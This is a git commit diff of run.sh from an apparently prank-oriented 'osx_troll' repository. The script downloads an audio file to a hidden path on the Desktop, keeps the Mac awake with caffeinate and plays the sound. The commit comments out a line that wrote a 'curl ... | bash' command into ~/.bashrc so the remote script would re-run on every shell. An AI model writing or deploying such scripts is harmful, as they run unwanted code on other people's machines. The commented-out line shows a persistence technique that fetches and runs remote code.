f27001f2558853e34432ff210263a526650e9433
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-03-03 16:08:21 +1100

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #! /bin/bash
 curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3
 
-echo "curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh | bash" >> ~/.bashrc
+#echo "curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh | bash" >> ~/.bashrc
 
 caffeinate &
 afplay ~/Desktop/.troll.mp3 &
